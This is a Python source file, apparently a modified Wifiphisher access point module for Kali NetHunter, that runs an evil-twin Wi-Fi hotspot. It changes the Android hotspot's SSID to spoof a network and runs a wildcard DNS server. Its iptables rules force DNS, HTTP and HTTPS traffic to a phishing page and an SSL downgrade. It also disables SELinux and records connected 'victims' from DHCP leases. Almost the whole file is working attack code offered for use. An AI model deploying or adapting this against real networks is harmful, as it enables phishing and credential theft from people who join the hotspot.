"""
AccessPoint module - patched for NetHunter v6.

ROOT CAUSE OF CAPTIVE PORTAL FAILURE (v3-v5):
  firewall.py added: DNAT :53 → GW:53 (Android's dnsmasq = real DNS)
  Our code added:    REDIRECT :53 → :15353 (our wildcard dnsmasq)
  But DNAT rule came FIRST in iptables chain → always matched first
  → DNS went to Android dnsmasq → real DNS → no captive portal

FIX (v6):
  pywifiphisher.py NO LONGER calls firewall.redirect_requests_localhost()
  in NetHunter mode. Instead, THIS module sets up ALL iptables rules:

    1. DNS: REDIRECT :53 → :15353 (our wildcard dnsmasq)
    2. HTTP: DNAT :80 → GW:8080 (tornado phishing server)
    3. HTTPS: DNAT :443 → GW:443 (tornado SSL downgrade)

  Rules are on the hotspot interface only (-i wlan2).
  Android dnsmasq on :53 stays alive for DHCP but never sees DNS packets.
"""
import os
import re
import time
import subprocess
import logging

logger = logging.getLogger(__name__)

try:
    from roguehostapd import hostapd_controller
    from roguehostapd import hostapd_constants
    HAS_ROGUEHOSTAPD = True
except ImportError:
    HAS_ROGUEHOSTAPD = False

import wifiphisher.common.constants as constants


def detect_android_hotspot():
    """
    Detect Android's native hotspot interface and gateway IP.
    Returns (interface_name, gateway_ip) or (None, None).
    """
    try:
        output = subprocess.check_output(
            ['ip', '-4', 'addr', 'show'], stderr=subprocess.PIPE
        ).decode('utf-8', errors='replace')
    except (subprocess.CalledProcessError, OSError):
        return None, None

    current_iface = None
    SKIP_IFACES = ['rmnet', 'dummy', 'ifb', 'lo', 'r_rmnet', 'wwan',
                   'rmnet_data', 'rmnet_ipa']
    WIFI_PATTERNS = ['wlan', 'ap', 'swlan', 'softap']

    for line in output.splitlines():
        iface_match = re.match(r'^\d+:\s+(\S+?)[@:]', line)
        if iface_match:
            current_iface = iface_match.group(1)
            continue

        inet_match = re.search(r'inet\s+([\d.]+)/(\d+)', line)
        if inet_match and current_iface:
            ip = inet_match.group(1)
            if any(skip in current_iface for skip in SKIP_IFACES):
                continue
            is_wifi_iface = any(p in current_iface for p in WIFI_PATTERNS)
            if not is_wifi_iface:
                continue
            if (ip.startswith('192.168.') or
                ip.startswith('10.') or
                re.match(r'^172\.(1[6-9]|2\d|3[01])\.', ip)):
                return current_iface, ip

    return None, None


def is_nethunter_environment():
    """Check if we're running on NetHunter/Android."""
    indicators = [
        os.path.exists('/system/build.prop'),
        os.path.exists('/data/local/nhsystem'),
        os.path.exists('/data/data/com.offsec.nethunter'),
        os.path.exists('/system/bin/app_process'),
        'ANDROID_ROOT' in os.environ,
    ]
    return any(indicators)


def _run_android_cmd(cmd_list, timeout=10):
    """Run a command via nsenter (outside chroot) with fallback."""
    try:
        full_cmd = ['nsenter', '-t', '1', '-m', '--'] + cmd_list
        result = subprocess.Popen(
            full_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = result.communicate(timeout=timeout)
        return result.returncode, out.decode('utf-8', errors='replace'), err.decode('utf-8', errors='replace')
    except Exception as e:
        try:
            result = subprocess.Popen(
                cmd_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = result.communicate(timeout=timeout)
            return result.returncode, out.decode('utf-8', errors='replace'), err.decode('utf-8', errors='replace')
        except Exception:
            return -1, '', str(e)


def _find_free_port(start=15353, end=15499):
    """
    Find a free UDP+TCP port by reading /proc/net.
    """
    in_use = set()
    try:
        for proto_file in ['/proc/net/tcp', '/proc/net/tcp6',
                           '/proc/net/udp', '/proc/net/udp6']:
            try:
                with open(proto_file) as f:
                    for line in f.readlines()[1:]:
                        parts = line.strip().split()
                        if len(parts) >= 2:
                            port_hex = parts[1].split(':')[1]
                            port = int(port_hex, 16)
                            in_use.add(port)
            except (IOError, OSError):
                continue
    except Exception:
        pass

    for port in range(start, end + 1):
        if port not in in_use:
            return port
    return start


class AccessPoint(object):
    def __init__(self):
        self.interface = None
        self.internet_interface = None
        self.channel = None
        self.essid = None
        self.psk = None
        self.hostapd_object = None
        self.deny_mac_addrs = []
        self._nethunter_mode = False
        self._hotspot_iface = None
        self._hotspot_ip = None
        self._dnsmasq_proc = None
        self._dns_port = None  # Port our dnsmasq bound to

    @property
    def nethunter_mode(self):
        return self._nethunter_mode

    def enable_nethunter_mode(self, hotspot_iface=None, hotspot_ip=None):
        self._nethunter_mode = True
        if hotspot_iface and hotspot_ip:
            self._hotspot_iface = hotspot_iface
            self._hotspot_ip = hotspot_ip
        else:
            self._hotspot_iface, self._hotspot_ip = detect_android_hotspot()

        if self._hotspot_iface:
            self.interface = self._hotspot_iface
            constants.NETWORK_GW_IP = self._hotspot_ip
            ip_parts = self._hotspot_ip.rsplit('.', 1)
            constants.NETWORK_IP = ip_parts[0] + '.0'
            constants.DHCP_LEASE = '{0}.10,{0}.250,12h'.format(ip_parts[0])
            logger.info("NetHunter mode: using %s (%s)",
                        self._hotspot_iface, self._hotspot_ip)
            return True
        else:
            logger.error("NetHunter mode: no hotspot detected!")
            return False

    # ----------------------------------------------------------------
    # SSID management
    # ----------------------------------------------------------------

    def get_android_ssid(self):
        if self.interface:
            try:
                out = subprocess.check_output(
                    ['iwconfig', self.interface], stderr=subprocess.PIPE
                ).decode('utf-8', errors='replace')
                m = re.search(r'ESSID:"([^"]+)"', out)
                if m:
                    return m.group(1)
            except (subprocess.CalledProcessError, OSError):
                pass
        config_paths = [
            '/data/misc/apexdata/com.android.wifi/WifiConfigStoreSoftAp.xml',
            '/data/misc/wifi/WifiConfigStoreSoftAp.xml',
        ]
        for cp in config_paths:
            ret, out, _ = _run_android_cmd(['cat', cp])
            if ret == 0 and out.strip():
                m = re.search(r'name="(?:Wifi)?[Ss]sid"[^>]*>([^<]+)<', out)
                if m:
                    return m.group(1)
        return None

    def change_android_ssid(self, new_ssid):
        if not new_ssid:
            return False
        print("[*] Changing Android hotspot SSID to: %s" % new_ssid)
        changed = False
        ret, out, err = _run_android_cmd(
            ['cmd', 'wifi', 'set-softap-config', '--ssid', new_ssid])
        if ret == 0 and 'error' not in (out + err).lower():
            changed = True
            print("[+] SSID changed via 'cmd wifi'")
        if not changed:
            for cp in ['/data/misc/apexdata/com.android.wifi/WifiConfigStoreSoftAp.xml',
                       '/data/misc/wifi/WifiConfigStoreSoftAp.xml']:
                ret, content, _ = _run_android_cmd(['cat', cp])
                if ret != 0 or not content.strip():
                    continue
                new_content, count = re.subn(
                    r'(name="(?:Wifi)?[Ss]sid"[^>]*>)[^<]*(</)',
                    r'\g<1>' + new_ssid + r'\g<2>', content)
                if count > 0:
                    tmp = '/data/local/tmp/_softap_ssid.xml'
                    escaped = new_content.replace("'", "'\"'\"'")
                    _run_android_cmd(['sh', '-c', "printf '%s' > %s" % (escaped, tmp)])
                    _run_android_cmd(['cp', tmp, cp])
                    _run_android_cmd(['rm', tmp])
                    changed = True
                    break
        if changed:
            print("[*] Restarting hotspot to apply SSID...")
            self._restart_android_hotspot()
            for i in range(20):
                time.sleep(1)
                iface, ip = detect_android_hotspot()
                if iface:
                    self._hotspot_iface = iface
                    self._hotspot_ip = ip
                    self.interface = iface
                    constants.NETWORK_GW_IP = ip
                    ip_parts = ip.rsplit('.', 1)
                    constants.NETWORK_IP = ip_parts[0] + '.0'
                    constants.DHCP_LEASE = '{0}.10,{0}.250,12h'.format(ip_parts[0])
                    print("[+] Hotspot back: %s (%s) SSID=%s" %
                          (iface, ip, self.get_android_ssid() or "?"))
                    return True
            print("[!] Hotspot didn't come back in 20s")
            return False
        else:
            print("[!] Change SSID manually: Settings > Hotspot > Name")
            return False

    def _restart_android_hotspot(self):
        for off_cmd, on_cmd in [
            (['cmd', 'connectivity', 'tethering', 'wifi', 'disable'],
             ['cmd', 'connectivity', 'tethering', 'wifi', 'enable']),
            (['svc', 'wifi', 'tether', 'stop'],
             ['svc', 'wifi', 'tether', 'start']),
        ]:
            ret, _, _ = _run_android_cmd(off_cmd)
            if ret == 0:
                time.sleep(3)
                _run_android_cmd(on_cmd)
                return

    # ----------------------------------------------------------------
    # Standard setters
    # ----------------------------------------------------------------

    def set_interface(self, interface):
        if self._nethunter_mode and self._hotspot_iface:
            self.interface = self._hotspot_iface
        else:
            self.interface = interface

    def add_deny_macs(self, deny_mac_addrs):
        self.deny_mac_addrs.extend(deny_mac_addrs)

    def update_black_macs(self):
        if not HAS_ROGUEHOSTAPD:
            return
        with open(hostapd_constants.HOSTAPD_CONF_PATH, 'a') as output_fp:
            output_fp.write('macaddr_acl=0\n')
            output_fp.write('deny_mac_file=' + constants.DENY_MACS_PATH + '\n')
        with open(constants.DENY_MACS_PATH, 'w') as writer:
            for mac_addr in self.deny_mac_addrs:
                writer.write(mac_addr + '\n')

    def set_internet_interface(self, interface):
        self.internet_interface = interface

    def set_channel(self, channel):
        self.channel = channel

    def set_essid(self, essid):
        self.essid = essid

    def set_psk(self, psk):
        self.psk = psk

    # ----------------------------------------------------------------
    # DHCP/DNS + iptables — the core
    # ----------------------------------------------------------------

    def start_dhcp_dns(self):
        """
        NetHunter mode:
          Android dnsmasq stays alive → handles DHCP (clients get IPs)
          We start DNS-only dnsmasq on free high port → wildcard (all = GW_IP)
          We set up ALL iptables rules here (firewall.py is NOT called):
            - DNS REDIRECT → our dnsmasq (wildcard) → captive portal trigger
            - HTTP DNAT → tornado :8080 → serves phishing page
            - HTTPS DNAT → tornado :443 → SSL downgrade to HTTP

        Linux mode: original behavior (unchanged).
        """
        gw_ip = constants.NETWORK_GW_IP

        if self._nethunter_mode:
            print("[*] === NetHunter captive portal setup ===")
            print("[*] Android dnsmasq stays alive for DHCP")

            # ---- STEP 1: Start our DNS-only dnsmasq on a free port ----
            free_port = _find_free_port(15353, 15499)
            self._dns_port = free_port
            print("[+] Found free port for DNS: %d" % free_port)

            # DNS-ONLY config — NO dhcp directives at all
            config = (
                '# Wifiphisher DNS-only wildcard server\n'
                'port={port}\n'
                'listen-address={gw}\n'
                'listen-address=127.0.0.1\n'
                'no-dhcp-interface={iface}\n'
                'address=/#/{gw}\n'
                'no-resolv\n'
                'no-poll\n'
                'log-queries\n'
            ).format(port=free_port, gw=gw_ip, iface=self.interface)

            if self.internet_interface:
                # Internet sharing: forward to real DNS instead of wildcard
                config = config.replace(
                    'address=/#/{}\n'.format(gw_ip),
                    'server={}\n'.format(constants.PUBLIC_DNS))

            with open('/tmp/dhcpd.conf', 'w') as f:
                f.write(config)

            print("[+] DNS config (/tmp/dhcpd.conf):")
            for line in config.strip().split('\n'):
                if not line.startswith('#'):
                    print("    %s" % line)

            # Find dnsmasq binary
            dnsmasq_bin = None
            for path in ['/usr/sbin/dnsmasq', '/usr/bin/dnsmasq',
                         '/sbin/dnsmasq']:
                if os.path.isfile(path):
                    dnsmasq_bin = path
                    break
            if not dnsmasq_bin:
                try:
                    dnsmasq_bin = subprocess.check_output(
                        ['which', 'dnsmasq'], stderr=subprocess.PIPE
                    ).decode('utf-8').strip()
                except:
                    pass
            if not dnsmasq_bin:
                print("[!] dnsmasq not found! apt install dnsmasq")
                return

            print("[*] Using: %s" % dnsmasq_bin)

            # Start dnsmasq
            try:
                self._dnsmasq_proc = subprocess.Popen(
                    [dnsmasq_bin, '-C', '/tmp/dhcpd.conf', '-d',
                     '--log-facility=-'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT)
                time.sleep(1.5)

                if self._dnsmasq_proc.poll() is not None:
                    out = self._dnsmasq_proc.stdout.read().decode(
                        'utf-8', errors='replace')
                    print("[!] dnsmasq failed on port %d:" % free_port)
                    for line in out.strip().split('\n')[:5]:
                        print("    " + line)
                    self._dnsmasq_proc = None

                    # Retry with next port
                    free_port2 = _find_free_port(free_port + 1, 15599)
                    self._dns_port = free_port2
                    print("[*] Retrying port %d..." % free_port2)

                    config2 = config.replace(
                        'port=%d' % free_port,
                        'port=%d' % free_port2)
                    with open('/tmp/dhcpd.conf', 'w') as f:
                        f.write(config2)

                    self._dnsmasq_proc = subprocess.Popen(
                        [dnsmasq_bin, '-C', '/tmp/dhcpd.conf', '-d',
                         '--log-facility=-'],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT)
                    time.sleep(1.5)

                    if self._dnsmasq_proc.poll() is not None:
                        out = self._dnsmasq_proc.stdout.read().decode(
                            'utf-8', errors='replace')
                        print("[!] dnsmasq also failed on port %d:" % free_port2)
                        print("    " + out[:200])
                        self._dnsmasq_proc = None
                        print("[!] DNS hijack failed — no captive portal popup")
                        print("[!] Clients must go to http://%s:%s manually"
                              % (gw_ip, constants.PORT))
                        return
            except OSError as e:
                print("[!] Cannot execute dnsmasq: %s" % e)
                return

            actual_port = self._dns_port
            print("[+] dnsmasq running on port %d (PID %d)" %
                  (actual_port, self._dnsmasq_proc.pid))
            print("[+] DNS wildcard: ALL domains -> %s" % gw_ip)

            # ---- STEP 2: Set up ALL iptables rules ----
            #
            # CRITICAL: This is the ONLY place iptables rules are set up
            # in NetHunter mode. firewall.py is NOT called.
            #
            # Order matters! DNS REDIRECT must be FIRST so it catches
            # DNS before any other rule could.

            iface = self.interface
            print("[*] Setting up iptables on %s..." % iface)

            # First: flush any leftover PREROUTING rules from previous runs
            subprocess.call(
                'iptables -t nat -F PREROUTING 2>/dev/null',
                shell=True)

            # Rule 1+2: DNS → our wildcard dnsmasq (REDIRECT changes port only)
            subprocess.call(
                'iptables -t nat -A PREROUTING -i %s -p udp --dport 53 '
                '-j REDIRECT --to-port %d' % (iface, actual_port),
                shell=True)
            subprocess.call(
                'iptables -t nat -A PREROUTING -i %s -p tcp --dport 53 '
                '-j REDIRECT --to-port %d' % (iface, actual_port),
                shell=True)

            # Rule 3: HTTP → tornado on PORT (default 8080)
            subprocess.call(
                'iptables -t nat -A PREROUTING -i %s -p tcp --dport 80 '
                '-j DNAT --to-destination %s:%s'
                % (iface, gw_ip, constants.PORT),
                shell=True)

            # Rule 4: HTTPS → tornado on SSL_PORT (default 443)
            subprocess.call(
                'iptables -t nat -A PREROUTING -i %s -p tcp --dport 443 '
                '-j DNAT --to-destination %s:%s'
                % (iface, gw_ip, constants.SSL_PORT),
                shell=True)

            # Verify
            print("[+] iptables PREROUTING rules:")
            try:
                out = subprocess.check_output(
                    'iptables -t nat -L PREROUTING -n -v --line-numbers',
                    shell=True).decode('utf-8', errors='replace')
                for line in out.strip().split('\n'):
                    print("    " + line)
            except:
                pass

            print("")
            print("[+] === Captive portal ready! ===")
            print("[+] Flow: client DNS :53 → REDIRECT :%d → wildcard → %s"
                  % (actual_port, gw_ip))
            print("[+] Flow: client HTTP :80 → DNAT → %s:%s → tornado"
                  % (gw_ip, constants.PORT))
            print("[+] Flow: client HTTPS :443 → DNAT → %s:%s → tornado"
                  % (gw_ip, constants.SSL_PORT))
            print("")

        else:
            # ---- Original Linux behavior ----
            config = ('no-resolv\n' 'interface=%s\n' 'dhcp-range=%s\n')
            with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
                dhcpconf.write(config % (self.interface, constants.DHCP_LEASE))
            with open('/tmp/dhcpd.conf', 'a+') as dhcpconf:
                if self.internet_interface:
                    dhcpconf.write("server=%s" % (constants.PUBLIC_DNS,))
                else:
                    dhcpconf.write("address=/#/%s" % (gw_ip,))

            try:
                subprocess.Popen(
                    ['dnsmasq', '-C', '/tmp/dhcpd.conf'],
                    stdout=subprocess.PIPE,
                    stderr=constants.DN)
            except OSError:
                print("[!] dnsmasq is not installed!")
                raise Exception

            subprocess.Popen(
                ['ifconfig', str(self.interface), 'mtu', '1400'],
                stdout=constants.DN, stderr=constants.DN)
            subprocess.Popen(
                ['ifconfig', str(self.interface), 'up', gw_ip,
                 'netmask', constants.NETWORK_MASK],
                stdout=constants.DN, stderr=constants.DN)
            time.sleep(1)
            proc = subprocess.check_output(['ifconfig', str(self.interface)])
            if gw_ip not in proc.decode('utf-8', errors='replace'):
                return False

    # ----------------------------------------------------------------
    # Start AP
    # ----------------------------------------------------------------

    def start(self):
        if self._nethunter_mode:
            logger.info("NetHunter mode: skipping hostapd")
            print("[*] NetHunter mode: using Android native hotspot on %s"
                  % self.interface)

            for sysctl_path, value in [
                ('/proc/sys/net/ipv4/ip_forward', '1'),
                ('/proc/sys/net/ipv4/conf/%s/rp_filter' % self.interface, '0'),
                ('/proc/sys/net/ipv4/conf/all/rp_filter', '0'),
            ]:
                try:
                    with open(sysctl_path, 'w') as f:
                        f.write(value)
                except (IOError, OSError):
                    pass

            try:
                subprocess.call(['setenforce', '0'],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except OSError:
                pass

            if self.essid:
                current_ssid = self.get_android_ssid()
                if current_ssid and current_ssid != self.essid:
                    print("[*] Current SSID: %s -> Requested: %s" %
                          (current_ssid, self.essid))
                    self.change_android_ssid(self.essid)
                elif not current_ssid:
                    self.change_android_ssid(self.essid)
                else:
                    print("[+] SSID already matches: %s" % self.essid)
            return

        # ---- Original Linux ----
        if not HAS_ROGUEHOSTAPD:
            self._start_system_hostapd()
            return

        hostapd_config = {
            "ssid": self.essid,
            "interface": self.interface,
            "channel": self.channel,
            "karma_enable": 1
        }
        if self.psk:
            hostapd_config['wpa_passphrase'] = self.psk

        hostapd_options = {
            'debug_level': hostapd_constants.HOSTAPD_DEBUG_OFF,
            'mute': True,
            "eloop_term_disable": True
        }

        try:
            self.hostapd_object = hostapd_controller.Hostapd()
            self.hostapd_object.start(hostapd_config, hostapd_options)
        except KeyboardInterrupt:
            raise Exception
        except BaseException:
            self._start_system_hostapd()

    def _start_system_hostapd(self):
        if HAS_ROGUEHOSTAPD:
            hostapd_config = {
                "ssid": self.essid,
                "interface": self.interface,
                "channel": self.channel,
            }
            hostapd_options = {}
            hostapd_config_obj = hostapd_controller.HostapdConfig()
            hostapd_config_obj.write_configs(hostapd_config, hostapd_options)
            self.update_black_macs()
            conf_path = hostapd_constants.HOSTAPD_CONF_PATH
        else:
            conf_path = '/tmp/hostapd.conf'
            with open(conf_path, 'w') as f:
                f.write('interface=%s\n' % self.interface)
                f.write('driver=nl80211\n')
                f.write('ssid=%s\n' % (self.essid or 'Rogue_AP'))
                f.write('hw_mode=g\n')
                f.write('channel=%s\n' % (self.channel or '6'))
                f.write('wmm_enabled=0\n')
                f.write('macaddr_acl=0\n')
                f.write('auth_algs=1\n')
                f.write('wpa=0\n')
                if self.psk:
                    f.write('wpa=2\n')
                    f.write('wpa_passphrase=%s\n' % self.psk)
                    f.write('wpa_key_mgmt=WPA-PSK\n')

        try:
            self.hostapd_object = subprocess.Popen(
                ['hostapd', conf_path],
                stdout=constants.DN, stderr=constants.DN)
        except OSError:
            print("[!] hostapd is not installed!")
            raise Exception

        time.sleep(2)
        if self.hostapd_object.poll() is not None:
            print("[!] hostapd failed to start!")
            raise Exception

    # ----------------------------------------------------------------
    # Lease file (TUI)
    # ----------------------------------------------------------------

    def read_connected_victims_file(self):
        lease_paths = []
        if self._nethunter_mode:
            lease_paths = [
                '/data/misc/dhcp/dnsmasq.leases',
                '/tmp/dnsmasq.leases',
            ]
            if self.interface:
                lease_paths.insert(0,
                    '/data/misc/dhcp/dnsmasq.leases.%s' % self.interface)
        else:
            lease_paths = ['/var/lib/misc/dnsmasq.leases']

        lease_file = None
        for lf in lease_paths:
            if os.path.isfile(lf):
                lease_file = lf
                break

        if not lease_file:
            return

        try:
            from wifiphisher.common.victim import Victims, Victim
        except ImportError:
            return

        victims_instance = Victims.get_instance()
        try:
            with open(lease_file, 'r') as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) >= 3:
                        mac = parts[1]
                        ip = parts[2]
                        if mac not in victims_instance.victims_dic:
                            victim = Victim(mac, ip)
                            victims_instance.add_to_victim_dic(victim)
                            try:
                                victim.associate_victim_mac_to_vendor(mac)
                            except:
                                pass
        except (IOError, OSError):
            pass

    # ----------------------------------------------------------------
    # Cleanup
    # ----------------------------------------------------------------

    def on_exit(self):
        """
        Clean up: kill our dnsmasq, remove ALL iptables rules we added.
        Android dnsmasq and hotspot LEFT UNTOUCHED.
        """
        # Kill only OUR dnsmasq
        if self._dnsmasq_proc:
            try:
                self._dnsmasq_proc.terminate()
                self._dnsmasq_proc.wait(timeout=2)
            except:
                try:
                    self._dnsmasq_proc.kill()
                except:
                    pass

        # Remove iptables rules
        if self._nethunter_mode and self.interface and self._dns_port:
            iface = self.interface
            port = self._dns_port
            gw = constants.NETWORK_GW_IP

            # Remove DNS REDIRECT rules
            for proto in ['udp', 'tcp']:
                subprocess.call(
                    'iptables -t nat -D PREROUTING -i %s -p %s --dport 53 '
                    '-j REDIRECT --to-port %d 2>/dev/null'
                    % (iface, proto, port),
                    shell=True)

            # Remove HTTP DNAT rule
            subprocess.call(
                'iptables -t nat -D PREROUTING -i %s -p tcp --dport 80 '
                '-j DNAT --to-destination %s:%s 2>/dev/null'
                % (iface, gw, constants.PORT),
                shell=True)

            # Remove HTTPS DNAT rule
            subprocess.call(
                'iptables -t nat -D PREROUTING -i %s -p tcp --dport 443 '
                '-j DNAT --to-destination %s:%s 2>/dev/null'
                % (iface, gw, constants.SSL_PORT),
                shell=True)

            print("[+] iptables rules removed")

        if self._nethunter_mode:
            for f in ['/tmp/dhcpd.conf']:
                if os.path.isfile(f):
                    try:
                        os.remove(f)
                    except:
                        pass
            return

        # Original Linux cleanup
        try:
            self.hostapd_object.stop()
        except BaseException:
            subprocess.call('pkill hostapd', shell=True)
            if HAS_ROGUEHOSTAPD:
                if os.path.isfile(hostapd_constants.HOSTAPD_CONF_PATH):
                    os.remove(hostapd_constants.HOSTAPD_CONF_PATH)
            if os.path.isfile(constants.DENY_MACS_PATH):
                os.remove(constants.DENY_MACS_PATH)

        subprocess.call('pkill dnsmasq', shell=True)

        if os.path.isfile('/var/lib/misc/dnsmasq.leases'):
            os.remove('/var/lib/misc/dnsmasq.leases')
        if os.path.isfile('/tmp/dhcpd.conf'):
            os.remove('/tmp/dhcpd.conf')
        time.sleep(2)
